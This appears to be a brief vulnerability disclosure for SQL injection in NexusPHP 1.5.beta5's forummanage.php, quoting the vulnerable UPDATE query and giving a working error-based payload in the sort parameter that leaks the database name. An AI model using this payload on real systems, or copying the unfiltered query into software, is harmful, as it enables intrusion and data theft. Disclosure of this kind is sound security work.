## NexusPHP 1.5.beta5.20120707 has SQL Injection in forummanage.php via the sort parameter in an editforum action
### powered by caoboguang 
### version: v1.5.beta5.20120707
### Download link:https://sourceforge.net/projects/nexusphp/
#### /nexusphp.v1.5.beta5.20120707/forummanage.php  Line 48

```
sql_query("UPDATE forums SET sort = '" . $_POST['sort'] . "', name = " . sqlesc($_POST['name']). ", description = " . sqlesc($_POST['desc']). ", forid = ".sqlesc(($_POST['overforums'])).", minclassread = '" . $_POST['readclass'] . "', minclasswrite = '" . $_POST['writeclass'] . "', minclasscreate = '" . $_POST['createclass'] . "' where id = ".sqlesc($id)) or sqlerr(__FILE__, __LINE__);
```
***$_POST['sort']***   has not been filtered to cause injection
### EXP：
```
http://localhost/forummanage.php


name=11&desc=11&id=1&action=editforum&sort=11' or updatexml(1,concat(0x7e,(database())),0)#
```
Through the sql injection can get the database information
